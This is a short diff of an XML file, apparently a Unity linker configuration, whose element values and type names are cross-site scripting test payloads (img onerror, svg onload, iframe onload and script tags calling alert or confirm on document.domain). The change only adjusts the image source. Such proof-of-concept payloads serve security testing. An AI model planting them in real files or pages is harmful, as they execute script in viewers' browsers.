@@ -12,8 +12,8 @@
     <child>
       <internal>
        <data><svg><style>{font-family&colon;'<iframe/onload=confirm(document.domain)>'</data>
-       <data><img src=ℹ️ onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</data>
-       <unique><img src=ℹ️ onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</unique>
+       <data><img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</data>
+       <unique><img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</unique>
 </internal>
     </child>
   </result>
@@ -21,7 +21,7 @@
 
 <linker>
        <assembly fullname="UnityEngine">
-               <type fullname="UnityEngine.<img src=ℹ️ onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>" preserve="all"/>
-               <type fullname="UnityEngine.<img src=ℹ️ onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>" preserve="all"/>
+               <type fullname="UnityEngine.<img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>" preserve="all"/>
+               <type fullname="UnityEngine.<img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>" preserve="all"/>
        </assembly>
 </linker>
